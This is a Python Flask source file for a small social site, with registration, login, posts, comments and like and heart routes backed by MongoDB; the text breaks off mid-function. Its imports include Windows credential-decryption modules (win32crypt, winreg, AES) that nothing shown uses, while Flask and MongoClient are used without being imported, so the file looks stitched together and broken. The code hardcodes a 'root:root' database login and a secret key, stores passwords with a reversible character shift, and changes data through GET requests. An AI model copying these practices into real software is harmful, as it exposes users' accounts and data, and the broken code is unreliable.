import os
from supabase import create_client, Client
import platform
import winreg
import sqlite3
import shutil
import base64
import win32crypt
import json
from Cryptodome.Cipher import AES
import csv
import re
import random
import string
#############################################
rtf = False
try:
  password = os.environ.get('MONGODB_PWD')
  connection_string = f"mongodb+srv://root:root@waliwo.devaw.mongodb.net/?retryWrites=true&w=majority"
  client = MongoClient(connection_string)
  dbs = client.list_database_names()
  tets_db = client.user
  collections = tets_db.list_collection_names()
  print(collections)
  app = Flask(__name__)
  app.config["SESSION_PERMANENT"] = True
  app.config["SESSION_TYPE"] = "filesystem"
  app.config["SECRET_KEY"] = 'tuwnhkmdbgspqlloskm523943557'
  app.config["IMAGE_UPLOADS"] = "WaliwoPlus/static/statics/"
  app.config["POST_PICS"] = "WaliwoPlus/static/statics/"
  os.environ['GOOGLE_APPLICATION_CREDENTIALS'] ='WaliwoPlus/ServiceKey_GoogleCloud.json'
  storage_client = storage.Client()
  bucket = storage_client.get_bucket('waliwo')
  app.permanent_session_lifetime=timedelta(days=60)
  Session(app) 




  # blob=bucket.blob('Post-Pics/homer-simpson.gifff')
  # filename='homer-simpson.gif'
  # blob.upload_from_filename(filename)
  # blob.delete()
  #hlsbzmttaszipjub


  # collection = tets_db.post
  # colect = collection.find({"postIdentifier":"251c2a4e-7074-4659-8d02-7aec3e959beb"})
  # for post in colect:
  #   print("works")
  # print("Before: ",post['Post_Created'])
  # time_change = datetime.timedelta(weeks = 2)
  # FlavorFlav = post['Post_Created'] + time_change
  # print("After: ",FlavorFlav)
  # dt_local = datetime.datetime.now(pytz.utc)
  # dt_us_central = dt_local.astimezone(pytz.timezone('US/Central'))
  # GetTime = dt_us_central.strftime("/%m/%d/%y %I:%M:%S %p")
  # print(GetTime)
  # GetTime = str(GetTime)
  # print(GetTime)
  # format = "/%m/%d/%y %I:%M:%S %p"
  # data = datetime.datetime.strptime(GetTime, format)
  # print("Current Time ",data)
  # if post['likes'] == 0 and data > FlavorFlav:
  #   print("Post is beyond paremeter length and doesnt wualify for trending")
  # elif post['likes'] != 0 and data < FlavorFlav or post['likes'] == 0 and data < FlavorFlav:
  #   print("Post is still within 2 weeks")


  # collection = tets_db.Preferences

  # insertThis = {'$set':{"RequestFollowers":False,"RequestFriends":False,"BlockFollowers":False,"BlockFriends":False}}
  # collection.update_many({"Hide_Hearts":False},insertThis)



  ##############################################


  ##############################################
  @app.route('/', methods=["POST", "GET"])
  @app.route('/register', methods=["POST", "GET"])
  def hello_world():
    if request.method == 'POST':
      email = request.form.get("email")
      pass_word = request.form.get("pass_word")
      name = request.form.get("name")
      collection = tets_db.user
      Preferences = tets_db.Preferences
      inuq_id = uuid.uuid4()
      dt_local = datetime.datetime.now(pytz.utc)
      dt_us_central = dt_local.astimezone(pytz.timezone('US/Central'))
      INT_ENTER = random.randrange(1000, 10000000000000000)  
      shift = 25
      Chazard = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ1234567890!@#$%^&*()/.,;\[]:=-{|}+*`~?<>?'
      shifted =Chazard[shift:] +Chazard[:shift]
      table = str.maketrans(Chazard, shifted)

      encripted = pass_word.translate(table)
      print(encripted)
      msg['subject'] = 'Beautiful Subject'
      msg['From'] = EMAIL_ADDRESS
      msg['To'] = email

      msg.set_content(f"""
      <div style="color:red;"> 
      
      {name}
      </div>""", subtype='html')
      with smtplib.SMTP_SSL('smtp.gmail.com', 465) as smtp:
          smtp.login(EMAIL_ADDRESS, EMAIL_PASSWORD)
          smtp.send_message(msg)
      test_docu = {
        'PERM_ID': str(inuq_id),
        'email': email,
        'password': str(encripted),
        'name': name,
        'username': '',
        'uuID': str(inuq_id),
        'Account_Created': dt_us_central.strftime("/%m/%d/%y"),
        "profilePic":
        'https://firebasestorage.googleapis.com/v0/b/waliwo/o/profilePic%2FdefaultPic.jpg?alt=media&token=ee715c17-dbf0-434e-871a-90b8e93017bd',
        'UNIVERSAL_INT': INT_ENTER,
        "IMG-NAME":"defaultPic.jpg",
        "Followers":0,
        'Following':0,
        'Friends':0
      }
      Preference = {
        'UserID': str(inuq_id),'UNIVERSAL_ID': INT_ENTER,"PrivateAccount":False,"Hide_Hearts":False,"Hide_Post":False,"Hide_Followers":False,"Hide_Friends":False,"RequestFollowers":False,"RequestFriends":False,"BlockFriends":False
      }
      duplex = collection.count_documents({'email': email}) > 0
      print(duplex)
    try:
      if duplex == True:
        return "<h1>Email Already Exist</h1>"
    except:
      pass
    else:
      session['user'] = email
      Preferences.insert_one(Preference)
      inserted_id = collection.insert_one(test_docu).inserted_id
      print(inserted_id)
      return redirect('/username')
    if 'user' in session:
      inuq_ID = session['user']
      collection = tets_db.user
      exists_ID = collection.count_documents({'uuID': str(inuq_ID)}) > 0
      if exists_ID == True:
        return redirect("/login")
      else:
        session['user'] = "GUEST_USER"
        

    return render_template('LoginRegSYS/register.html')


  ##############################################


  ##############################################
  @app.route('/GUEST',methods=["GET","POST"])
  def GuestUser():
      collection = tets_db.user
      GuestUser = collection.find({"Value":"GUEST_USER"})
      for Guest in GuestUser:
          print("GuestUser")
      if 'user' in session:
          session['user'] = Guest['Value']
          return "<h1>1</h1>"
      else:
          session['user'] = Guest['Value']
          door = session['user']
          return f"<h1>{door}</h1>"
  ##############################################


  ##############################################
  @app.route(
    '/username',
    methods=["POST", "GET"],
  )
  def username():
    if request.method == 'POST':
      username = request.form.get("username")
      collection = tets_db.user
      test_docu = {'username': username}
      if "user" in session:
        user = session['user']
      duplex = collection.count_documents({'username': username}) > 0
      hail = (user)
      print(collection)
    try:
      if duplex == True:
        return "<h1>Username Taken !</h1>"
    except:
      pass
    else:
      all_updates = {'$set': {'username': username}}
      collection.update_one({'email': user}, all_updates)
      return redirect('/login')
      print(duplex)
    return render_template('LoginRegSYS/username.html')


  ##############################################


  ##############################################
  @app.route('/login', methods=["GET", "POST"])
  def login():
    if request.method == 'POST':
      email = request.form.get("email")
      username = request.form.get("email")
      pass_word = request.form.get("pass_word")
      collection = tets_db.user
      pass_word = str(pass_word)
      i = "None"
      byson = False
      Result = collection.find({"email":email})
      for i in Result:
        pass
      x = i['password']
      x = str(x)
      tin = f"{x}"
      print(tin)
      shift = 93-25
      Chazard = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ1234567890!@#$%^&*()/.,;\[]:=-{|}+*`~?<>?'
      print(len(Chazard))
      shifted =Chazard[shift:] +Chazard[:shift]
      table = str.maketrans(Chazard, shifted)

      encripted = x.translate(table)
      print("ENCRIPTED TEXT",encripted)

      # shifted1 =Chazard[shift:] +Chazard[:shift]
      # table1 = str.maketrans(Chazard, shifted1)
      # LocalUserX = x.translate(table1)
      # print(LocalUserX)

      if encripted==pass_word:
        byson = True
      

      if byson == True:
        inuq_id = uuid.uuid4()
        print(inuq_id)
        all_updates = {'$set': {'uuID': str(inuq_id)}}
        collection.update_one({'email': email}, all_updates)
        session['user'] = inuq_id
        session.permanent = True
        print(inuq_id)
        return redirect("/home")
      else:
        return render_template('LoginRegSYS/login.html')
    if 'user' in session:
      inuq_ID = session['user']
      session.permanent = True
      collection = tets_db.user
      exists_ID = collection.count_documents({'uuID': str(inuq_ID)}) > 0
      if exists_ID == True:
        return redirect("/home")
      else:
        return render_template('LoginRegSYS/login.html')
    return render_template('LoginRegSYS/login.html')


  ##############################################

  ##############################################
  @app.route('/logout',methods=["GET"])
  def logout():
      session.pop('user',None)
      return redirect('/login')

  ##############################################
  @app.route('/home', methods=["GET", "POST"])
  def home():
    search = None
    try:
      uu_id = session['user']
    except:
      uu_id = 'GUEST_USER'
    collection = tets_db.post
    collection1 = tets_db.user
    reactant = tets_db.reaction
    if uu_id == None:
      if uu_id != 'GUEST_USER':
        uu_id = "GUEST_USER"
    users = uu_id
    try:
      pre_usr_chn = collection1.find({'uuID': str(uu_id)})
      for users in pre_usr_chn:
        print('checked')
    except:
      users = uu_id

    
    get_Tha_post = collection.find()
    for postings in get_Tha_post:
      print(postings)
    Get_user_Like_post = reactant.find({'PERM_ID': postings['PERM_ID']})
    
    post = collection.find()
    poster = collection1.find()
    if request.method == "POST":
      search = request.form.get("search")

    diuns = reactant.find()
    for diuns1 in diuns:
      print("Results")

    return render_template('home.html',
                          post=post,
                          poster=poster,
                          users=users,
                          search=search)


  ##############################################


  ##############################################
  @app.route('/profile/<uID>', methods=["GET", "POST"])
  def User_Profile(uID):
    FunkVerified = None
    search = None
    poster = None
    valid_two = None
    ValueGiven1 = None
    uu_id = session['user']
    collection = tets_db.user
    collections = tets_db.post
    PostPics = tets_db.PostPics
    Hearts = tets_db.Heart
    if uu_id == None:
      if uu_id != 'GUEST_USER':
        uu_id = "GUEST_USER"
    else:

      print(uID)
      tuff = collection.find({'PERM_ID': uID})
      for docs in tuff:
        print(docs)


      valid_two = None
      valid_two = collections.find({"PERM_ID": docs["PERM_ID"]})
      ValueGiven = collections.find({"PERM_ID": docs["PERM_ID"]})
      for ValueGiven1 in ValueGiven:
        print("Tested again")
      
      ValueMultiplyier = collections.find({"PERM_ID": docs["PERM_ID"]})
      for post in ValueMultiplyier:
        print('verified through')

      if request.method == "POST":
        search = request.form.get("search")
      if len(list(valid_two)) == 0:
        valid_two = None
      else:
        valid_two = collections.find({"PERM_ID": docs["PERM_ID"]})
      return render_template('profile.html',
                            post=docs,
                            search=search,
                            ValueGiven=ValueGiven1,valid_two=valid_two)


  ##############################################


  ##############################################
  @app.route('/post/<content_ID>/<huhhy>', methods=["GET", "POST"])
  def post_details(content_ID, huhhy):
    Post_Pics = None
    spots = 'GUEST_USER'
    verify_like_button = None
    Get_user_Like_post = None
    documents = None
    DaddyLongLegs = False
    FindHearted = False
    try:
      uu_id = session['user']
    except:
      uu_id = 'GUEST_USER'
      spots = uu_id
    inuq_id = uuid.uuid4()
    collection = tets_db.user
    collection1 = tets_db.post
    comments = tets_db.comment
    reactant = tets_db.reaction
    PostPics = tets_db.PostPics
    Hearts = tets_db.Heart
    INT_ENTER = random.randrange(1000, 10000000000000000) 
    Post_Pics = PostPics.find({"postIdentifier":content_ID})
    # for Pics in Post_Pics:
    #   print(Pics['Picure'])
    jelly = collection1.find({"postIdentifier":str(content_ID)})
    for Jello in jelly:
      print("Got Jelly")
    tuff = collection1.find({'postIdentifier': str(content_ID)})
    try:
      locater = collection.find({'uuID': str(uu_id)})
      for spots in locater:
        print("Spotter")
    except:
      spots = uu_id
    
    try:
      for documents in tuff:
        print("Documebts")
      FindHearted = Hearts.find({'Hearted-BY':spots['PERM_ID'],'HeartID':documents['INT_ID']})
      if len(list(FindHearted)) ==1:
        FindHearted = True
      else:
        FindHearted = False
      VerifyUser = documents['PERM_ID']
      VerifyPost = documents['postIdentifier']
      Finder = collection.find({'PERM_ID': str(VerifyUser)})
      for Userzz in Finder:
        print("Found Uzerzzz")
      Founderz = Userzz['PERM_ID']
      Downers = spots['PERM_ID']
      if str(Founderz) != str(Downers):
        print("ISnt Equal")
        DaddyLongLegs = False
      else:
        DaddyLongLegs = True
      commidoer = comments.find({'PERM_ID': content_ID})
      print('', huhhy)
      verify_like_button = reactant.find({
        'Liked_post_ID': documents['_id'],
        'Liked_by': spots['_id'],
        'UUID': documents["INT_ID"],
        'PERM_ID': documents['PERM_ID']
      })
      Get_user_Like_post = reactant.find({
        'Dislike_Post_ID': documents['_id'],
        'Disliked_By': spots['_id'],
        'UUID': documents["INT_ID"],
        'PERM_ID': documents['PERM_ID']
      })
      if len(list(verify_like_button)) == 0:
        print('None Found')
        verify_like_button = None
      else:
        print('Found')
        verify_like_button = 'Some Value'
      if len(list(Get_user_Like_post)) == 0:
        print('None Found')
        Get_user_Like_post = None
      else:
        print('Found')
        Get_user_Like_post = 'Some Value'
    except:
      commidoer = comments.find({'PERM_ID': content_ID})
    if uu_id != 'GUEST_USER':
      if request.method == 'POST':
        comment = request.form.get("comment")
        if len(comment) == 0:
          return '<h1>Post Too Short</h1>'
        if len(comment) > 0:
          dt_local = datetime.datetime.now(pytz.utc)
          dt_us_central = dt_local.astimezone(pytz.timezone('US/Central'))
          current_user = collection.find({'uuID': str(uu_id)})
          for turkey in current_user:
            print("Tested this stuff")
          comments.insert_one({
            'INT_ID': content_ID,
            "comments": comment,
            'posterrr':spots['UNIVERSAL_INT'],
            "Post_Created": dt_us_central.strftime("%I:%M:%S%p"),
            "poster_Pic": turkey['profilePic'],
            'PERM_ID': content_ID,
            "CommenterUsername":spots['username'],
            'likes':0,
            'Dislikes':0,
            'Reacs':0,
            'UNIQUEID':int(INT_ENTER)
          })
          CountDocs = comments.count_documents({'PERM_ID': content_ID})
          UpdateValues = {'$set': {"comments": int(CountDocs)}}
          HeartLikes = {'$set': { 'comments': int(CountDocs)}}
          Hearts.update_many({'HeartID':Jello['INT_ID']},HeartLikes)
          collection1.update_one({'postIdentifier': content_ID}, UpdateValues)
    return render_template('PostDetail/post_content.html',
                          post=documents,
                          comment=commidoer,
                          spots=spots,
                          Get_user_Like_post=Get_user_Like_post,
                          verify_like_button=verify_like_button,Pics=Post_Pics,DaddyLongLegs=DaddyLongLegs,FindHearted=FindHearted)


  ##############################################


  ##############################################
  @app.route('/comment/@<username>/<posterrr>/<content_ID>/<UNIQUEID>', methods=["GET", "POST"])
  def CommentSection(username, posterrr,content_ID,UNIQUEID):
      UNIQUEID = int(UNIQUEID)
      ValueAdded =False
      uu_id = session['user']
      collection = tets_db.user
      comments = tets_db.comment
      reactant = tets_db.reaction
      Uzerz = None
      FindReacts = collection.find({"uuID":str(uu_id)})
      for Uzerz in FindReacts:
          print("Found Current User")
      
      NameMe = str(content_ID)
      Users = None
      Comments = None
      FindUser = collection.find({'PERM_ID':str(NameMe),'UNIVERSAL_INT':int(posterrr)})
      for Users in FindUser:
          print("Found User")
      FindComment = comments.find({'PERM_ID':str(NameMe),'posterrr':int(posterrr),'UNIQUEID':UNIQUEID})
      for Comments in FindComment:
          print("Found Comment")
      SomeAddition = Uzerz['UNIVERSAL_INT']
      if int(SomeAddition) == int(posterrr):
          print("Are Equal")
          ValueAdded = True
      FindLiked = reactant.find({"CommentIdentifier":Comments['INT_ID'],"LikedBy":UNIQUEID,'UserID':Uzerz['PERM_ID'],'CommentLikedID':Comments['INT_ID']})
      if len(list(FindLiked)) ==0:
          FindLiked = 0
      else:
          FindLiked = 1
      FindDisliked = reactant.find({"CommentIdentifier":Comments['INT_ID'],"DislikedBy":UNIQUEID,'UserID':Uzerz['PERM_ID'],'CommentDislikedID':Comments['INT_ID']})
      if len(list(FindDisliked)) ==0:
          FindDisliked = 0
      else:
          FindDisliked = 1 
      return render_template("PostDetail/Comments.html",FindComment=Comments,FindUser=Users,FindDisliked=FindDisliked,FindLiked=FindLiked,ValueAdded=ValueAdded)
  ##############################################

  ##############################################
  @app.route('/comment/Edit/<posterrr>/<UNIQUEID>', methods=["GET", "POST"])
  def EditComment(posterrr,UNIQUEID):
    uu_id = session['user']
    collection = tets_db.user
    comments = tets_db.comment
    uu_id = str(uu_id)
    posterrr = int(posterrr)
    UNIQUEID = int(UNIQUEID)
    dt_local = datetime.datetime.now(pytz.utc)
    dt_us_central = dt_local.astimezone(pytz.timezone('US/Central'))
    FindCurrentUser = collection.find({'uuID':uu_id,'UNIVERSAL_INT':posterrr})
    for Userz in FindCurrentUser:
      print("Found 1")
    FindCurrentComment = comments.find({"UNIQUEID":UNIQUEID,'posterrr':posterrr})
    for Comment in FindCurrentComment:
      print("Found 2")
    TextData = Comment['comments']
    if request.method == 'POST':
      Post = request.form.get("Post")
      if Post == TextData:
        print("THE SAME")
        return redirect(f"/comment/@{Userz['username']}/{posterrr}/{Comment['INT_ID']}/{UNIQUEID}")
      else:
        Updater = {'$set': {"Edited": dt_us_central.strftime("%a %b %d %I:%M:%S%p"),'comments':str(Post)}}
        comments.update_one({"UNIQUEID":UNIQUEID,'posterrr':posterrr},Updater)
        return redirect(f"/comment/@{Userz['username']}/{posterrr}/{Comment['INT_ID']}/{UNIQUEID}")
    return render_template("EditPages/EditComment.html",Userz=Userz,Comment=Comment)
      
  ##############################################


  ##############################################
  @app.route('/comment/Delete/<posterrr>/<UNIQUEID>/<postIdentifier>', methods=["GET"])
  def DeleteComment(posterrr,UNIQUEID,postIdentifier):
      comments = tets_db.comment
      reactant = tets_db.reaction
      collection1 = tets_db.post
      Hearts = tets_db.Heart
      posterrr= int(posterrr)
      jelly = collection1.find({"postIdentifier":str(postIdentifier)})
      for Jello in jelly:
        print("Got Jelly")
      FindLike = reactant.find({"LikedBy":int(posterrr)})
      if len(list(FindLike)) ==0:
          print("has No Liked Post")
      else:
          FindLike = reactant.delete_one({"LikedBy":int(posterrr)})
      FindDislike = reactant.find({"DislikedBy":posterrr})
      if len(list(FindDislike)) ==0:
          print("has No Liked Post")
      else:
          FindDislike = reactant.delete_one({"DislikedBy":int(posterrr)})
      comments.delete_one({"UNIQUEID":int(UNIQUEID)})
      justify_name =comments.count_documents({"PERM_ID":str(postIdentifier)})
      yupper2 = {'$set': {"comments": int(justify_name)}}
      HeartLikes = {'$set': { 'comments': int(justify_name)}}
      Hearts.update_many({'HeartID':Jello['INT_ID']},HeartLikes)
      collection1.update_one({"postIdentifier":str(postIdentifier)},yupper2)
      return redirect("/home")
  ##############################################


  ##############################################
  @app.route('/comment/Dislike/<posterrr>', methods=["GET"])
  def CommentDislike(posterrr):
      posterrr = int(posterrr)
      comments = tets_db.comment
      collection1 = tets_db.user
      reactant = tets_db.reaction
      uu_id = session['user']
      GetLocalUser = collection1.find({"uuID":str(uu_id)})
      for LocalUser in GetLocalUser:
          print("Got Local User")
      GetComment = comments.find({'UNIQUEID':posterrr})
      for commment in GetComment:
          print("Got Comment")
      FindLike = reactant.find({"CommentIdentifier":commment['INT_ID'],"LikedBy":posterrr,'UserID':LocalUser['PERM_ID'],'CommentLikedID':commment['INT_ID']})
      if len(list(FindLike)) ==0:
          FindLike = 0
      else:
          FindLike = 1
      FindDislike = reactant.find({"CommentIdentifier":commment['INT_ID'],"DislikedBy":posterrr,'UserID':LocalUser['PERM_ID'],'CommentDislikedID':commment['INT_ID']})
      if len(list(FindDislike)) ==0:
          FindDislike = 0
      else:
          FindDislike = 1
      if FindLike == 1:
          reactant.delete_one({"CommentIdentifier":commment['INT_ID'],"LikedBy":posterrr,'UserID':LocalUser['PERM_ID'],'CommentLikedID':commment['INT_ID']})
          TotalDislikes = reactant.count_documents({'CommentDislikedID':commment['INT_ID']})
          TotalLikes = reactant.count_documents({'CommentLikedID':commment['INT_ID']})
          ripple = TotalDislikes + TotalLikes
          total_count = reactant.count_documents({'CommentLikedID':commment['INT_ID']})
          yupper2 = {'$set': {"likes": int(total_count), 'Reacs': ripple}}
          comments.update_one({'UNIQUEID': posterrr},yupper2)
          #=====================================================================================#
          reactant.insert_one({"CommentIdentifier":commment['INT_ID'],"DislikedBy":posterrr,'UserID':LocalUser['PERM_ID'],'CommentDislikedID':commment['INT_ID']})
          TotalDislikes = reactant.count_documents({'CommentDislikedID':commment['INT_ID']})
          TotalLikes = reactant.count_documents({'CommentLikedID':commment['INT_ID']})
          ripple = TotalDislikes + TotalLikes
          total_count1 = reactant.count_documents({'CommentDislikedID':commment['INT_ID']})
          yupper1 = {'$set': {"Dislikes": int(total_count1), 'Reacs': ripple}}
          comments.update_one({'UNIQUEID': posterrr},yupper1)
          print('Added Like')
      if FindDislike == 0 and FindLike == 0:
          reactant.insert_one({"CommentIdentifier":commment['INT_ID'],"DislikedBy":posterrr,'UserID':LocalUser['PERM_ID'],'CommentDislikedID':commment['INT_ID']})
          TotalDislikes = reactant.count_documents({'CommentDislikedID':commment['INT_ID']})
          TotalLikes = reactant.count_documents({'CommentLikedID':commment['INT_ID']})
          ripple = TotalDislikes + TotalLikes
          total_count1 = reactant.count_documents({'CommentDislikedID':commment['INT_ID']})
          yupper1 = {'$set': {"Dislikes": int(total_count1), 'Reacs': ripple}}
          comments.update_one({'UNIQUEID': posterrr},yupper1)
      if FindDislike == 1:
          reactant.delete_one({"CommentIdentifier":commment['INT_ID'],"DislikedBy":posterrr,'UserID':LocalUser['PERM_ID'],'CommentDislikedID':commment['INT_ID']})
          TotalDislikes = reactant.count_documents({'CommentDislikedID':commment['INT_ID']})
          TotalLikes = reactant.count_documents({'CommentLikedID':commment['INT_ID']})
          ripple = TotalDislikes + TotalLikes
          total_count = reactant.count_documents({'CommentDislikedID':commment['INT_ID']})
          yupper2 = {'$set': {"Dislikes": int(total_count), 'Reacs': ripple}}
          comments.update_one({'UNIQUEID': posterrr},yupper2)
      return redirect('/home')
  ##############################################


  ##############################################
  @app.route('/comment/like/<posterrr>', methods=["GET"])
  def CommentLike(posterrr):
      posterrr = int(posterrr)
      comments = tets_db.comment
      collection1 = tets_db.user
      reactant = tets_db.reaction
      uu_id = session['user']
      GetLocalUser = collection1.find({"uuID":str(uu_id)})
      for LocalUser in GetLocalUser:
          print("Got Local User")
      GetComment = comments.find({'UNIQUEID':posterrr})
      for commment in GetComment:
          print("Got Comment")
      
      FindLike = reactant.find({"CommentIdentifier":commment['INT_ID'],"LikedBy":posterrr,'UserID':LocalUser['PERM_ID'],'CommentLikedID':commment['INT_ID']})
      if len(list(FindLike)) ==0:
          FindLike = 0
      else:
          FindLike = 1
      FindDislike = reactant.find({"CommentIdentifier":commment['INT_ID'],"DislikedBy":posterrr,'UserID':LocalUser['PERM_ID'],'CommentDislikedID':commment['INT_ID']})
      if len(list(FindDislike)) ==0:
          FindDislike = 0
      else:
          FindDislike = 1
      if FindDislike == 1:
          reactant.delete_one({"CommentIdentifier":commment['INT_ID'],"DislikedBy":posterrr,'UserID':LocalUser['PERM_ID'],'CommentDislikedID':commment['INT_ID']})
          TotalDislikes = reactant.count_documents({'CommentDislikedID':commment['INT_ID']})
          TotalLikes = reactant.count_documents({'CommentLikedID':commment['INT_ID']})
          ripple = TotalDislikes + TotalLikes
          total_count = reactant.count_documents({'CommentDislikedID':commment['INT_ID']})
          yupper2 = {'$set': {"Dislikes": int(total_count), 'Reacs': ripple}}
          comments.update_one({'UNIQUEID': posterrr},yupper2)
          #=====================================================================================#
          reactant.insert_one({"CommentIdentifier":commment['INT_ID'],"LikedBy":posterrr,'UserID':LocalUser['PERM_ID'],'CommentLikedID':commment['INT_ID']})
          TotalDislikes = reactant.count_documents({'CommentDislikedID':commment['INT_ID']})
          TotalLikes = reactant.count_documents({'CommentLikedID':commment['INT_ID']})
          ripple = TotalDislikes + TotalLikes
          total_count1 = reactant.count_documents({'CommentLikedID':commment['INT_ID']})
          yupper1 = {'$set': {"likes": int(total_count1), 'Reacs': ripple}}
          comments.update_one({'UNIQUEID': posterrr},yupper1)
          print('Added Like')
      if FindLike == 0 and FindDislike == 0:
          reactant.insert_one({"CommentIdentifier":commment['INT_ID'],"LikedBy":posterrr,'UserID':LocalUser['PERM_ID'],'CommentLikedID':commment['INT_ID']})
          TotalDislikes = reactant.count_documents({'CommentDislikedID':commment['INT_ID']})
          TotalLikes = reactant.count_documents({'CommentLikedID':commment['INT_ID']})
          ripple = TotalDislikes + TotalLikes
          total_count1 = reactant.count_documents({'CommentLikedID':commment['INT_ID']})
          yupper1 = {'$set': {"likes": int(total_count1), 'Reacs': ripple}}
          comments.update_one({'UNIQUEID': posterrr},yupper1)
          print("TESTED ERROR")
      if FindLike==1:
          reactant.delete_one({"CommentIdentifier":commment['INT_ID'],"LikedBy":posterrr,'UserID':LocalUser['PERM_ID'],'CommentLikedID':commment['INT_ID']})
          TotalDislikes = reactant.count_documents({'CommentDislikedID':commment['INT_ID']})
          TotalLikes = reactant.count_documents({'CommentLikedID':commment['INT_ID']})
          ripple = TotalDislikes + TotalLikes
          total_count = reactant.count_documents({'CommentLikedID':commment['INT_ID']})
          yupper2 = {'$set': {"likes": int(total_count), 'Reacs': ripple}}
          comments.update_one({'UNIQUEID': posterrr},yupper2)
          print("TESTED ERRORs")
      return redirect('/home')
  ##############################################

  ##############################################
  @app.route('/Heart/<INT_ID>', methods=["GET"])
  def Heart(INT_ID):
    print("GOT THIS VALUE",INT_ID)
    Get_Heart = 0
    uu_id = session['user']
    collection = tets_db.post
    collection1 = tets_db.user
    Hearts = tets_db.Heart
    print("GOT THIS VALUE 1",INT_ID)
    get_Tha_User = collection1.find({'uuID': str(uu_id)})
    for users in get_Tha_User:
      print("Got the User")
      print("GOT THIS VALUE 2 ",INT_ID)
    get_Tha_post = collection.find({'INT_ID': int(INT_ID)})
    for post in get_Tha_post:
      print("Got Tha Post")
      print("GOT THIS VALUE 3",INT_ID)
    GETUSER  = users['PERM_ID']
    Get_Heart = Hearts.find({'Hearted-BY':str(GETUSER),'HeartID':int(INT_ID)})
    print("GOT THIS VALUE 4",INT_ID)
    AddMeUp = post['reacs']
    if len(list(Get_Heart)) ==0:
      Get_Heart = None
    else:
      Get_Heart = 0
      print("GOT THIS VALUE PLUS SOME",INT_ID)
    if Get_Heart == None:
      try:
        if post['PIC_PLACEHOLDER'] or post['PIC_PLACEHOLDER'] != "Null":
          try:
            if post['post']:
              Hearts.insert_one({'Hearted-BY':str(GETUSER),'HeartID':int(INT_ID),"Clicks":post['Clicks'],"comments":post['comments'],"reacs":post['reacs'],"username":post['username'],"ProfilePic":post['Foreign_key'],"post":post['post'],"PIC_PLACEHOLDER":post['PIC_PLACEHOLDER']})
              CountHearts = Hearts.count_documents({'HeartID':int(INT_ID)})
              Sum_total =AddMeUp + 1
              Hearting = {'$set': {"Hearts": int(CountHearts), 'reacs': int(Sum_total)}}
              HeartLikes = {'$set': { 'reacs': int(Sum_total)}}
              Hearts.update_many({'HeartID':post['INT_ID']},HeartLikes)
              collection.update_one({'postIdentifier': post['postIdentifier']},Hearting)
          except:
            Hearts.insert_one({'Hearted-BY':str(GETUSER),'HeartID':int(INT_ID),"Clicks":post['Clicks'],"comments":post['comments'],"reacs":post['reacs'],"username":post['username'],"ProfilePic":post['Foreign_key'],"PIC_PLACEHOLDER":post['PIC_PLACEHOLDER']})
            CountHearts = Hearts.count_documents({'HeartID':int(INT_ID)})
            Sum_total =AddMeUp + 1
            Hearting = {'$set': {"Hearts": int(CountHearts), 'reacs': int(Sum_total)}}
            HeartLikes = {'$set': { 'reacs': int(Sum_total)}}
            Hearts.update_many({'HeartID':post['INT_ID']},HeartLikes)
            collection.update_one({'postIdentifier': post['postIdentifier']},Hearting)
      except:
        Hearts.insert_one({'Hearted-BY':str(GETUSER),'HeartID':int(INT_ID),"Clicks":post['Clicks'],"comments":post['comments'],"reacs":post['reacs'],"username":post['username'],"post":post['post'],"ProfilePic":post['Foreign_key']})
        CountHearts = Hearts.count_documents({'HeartID':int(INT_ID)})
        Sum_total =AddMeUp + 1
        Hearting = {'$set': {"Hearts": int(CountHearts), 'reacs': int(Sum_total)}}
        HeartLikes = {'$set': { 'reacs': int(Sum_total)}}
        Hearts.update_many({'HeartID':post['INT_ID']},HeartLikes)
        collection.update_one({'postIdentifier': post['postIdentifier']},Hearting)

    if Get_Heart == 0:
      print("Deleted")
      Hearts.delete_one({'Hearted-BY':str(GETUSER),'HeartID':int(INT_ID)})
      CountHearts = Hearts.count_documents({'HeartID':int(INT_ID)})
      Sum_total =AddMeUp -1
      Hearting = {'$set': {"Hearts": int(CountHearts), 'reacs': int(Sum_total)}}
      HeartLikes = {'$set': { 'reacs': int(Sum_total)}}
      Hearts.update_many({'HeartID':post['INT_ID']},HeartLikes)
      collection.update_one({'postIdentifier': post['postIdentifier']},Hearting)
    return redirect("/home")
  ##############################################



  ##############################################
  @app.route('/likes/<post_id>', methods=["GET"])
  def reaction(post_id):
    print("THis is Like ID", post_id)
    uu_id = session['user']
    collection = tets_db.post
    collection1 = tets_db.user
    Hearts = tets_db.Heart
    reactant = tets_db.reaction
    
    get_Tha_post = collection.find({'INT_ID': int(post_id)})
    for postings in get_Tha_post:
      print(postings)

    try:
      FindHearts= Hearts.find({"HeartID":postings['INT_ID']})
      HeartsINPOST = len(list(FindHearts))
    except:
      HeartsINPOST = 0
    get_current_user = collection1.find({'uuID': str(uu_id)})
    for users in get_current_user:
      print(users)
    verify_like_button = reactant.find({
      'Liked_post_ID': postings['_id'],
      'Liked_by': users['_id'],
      'UUID': int(post_id),
      'PERM_ID': postings['PERM_ID']
    })
    Get_user_Like_post = reactant.find({
      'Dislike_Post_ID': postings['_id'],
      'Disliked_By': users['_id'],
      'UUID': int(post_id),
      'PERM_ID': postings['PERM_ID']
    })
    if len(list(Get_user_Like_post)) == 0:
      Dislike = 0
      print("has no value")
    else:
      Dislike = None

    if len(list(verify_like_button)) == 0:
      likes = 0
      print("has no value")
    else:
      likes = None

    if Dislike == None:
      reactant.delete_one({
        'Dislike_Post_ID': postings['_id'],
        'Disliked_By': users['_id'],
        'UUID': int(post_id),
        'PERM_ID': postings['PERM_ID']
      })
      SUMTOTAL = reactant.count_documents({'Dislike_Post_ID': postings['_id']})
      SUMTOTAL2 = reactant.count_documents({'Liked_post_ID': postings['_id']})
      ripple = SUMTOTAL + SUMTOTAL2 + HeartsINPOST
      collection.find({'postIdentifier': postings['postIdentifier']})
      total_count = reactant.count_documents({'UUID': int(post_id)})
      yupper2 = {'$set': {"dislikes": int(total_count), 'reacs': ripple}}
      HeartLikes = {'$set': { 'reacs': ripple}}
      Hearts.update_many({'HeartID':int(post_id)},HeartLikes)
      collection.update_one({'postIdentifier': postings['postIdentifier']},
                            yupper2)

      reactant.insert_one({
        'Liked_post_ID': postings['_id'],
        'Liked_by': users['_id'],
        'UUID': int(post_id),
        'PERM_ID': postings['PERM_ID']
      })
      SUMTOTAL = reactant.count_documents({'Dislike_Post_ID': postings['_id']})
      SUMTOTAL2 = reactant.count_documents({'Liked_post_ID': postings['_id']})
      ripple = SUMTOTAL + SUMTOTAL2 +HeartsINPOST
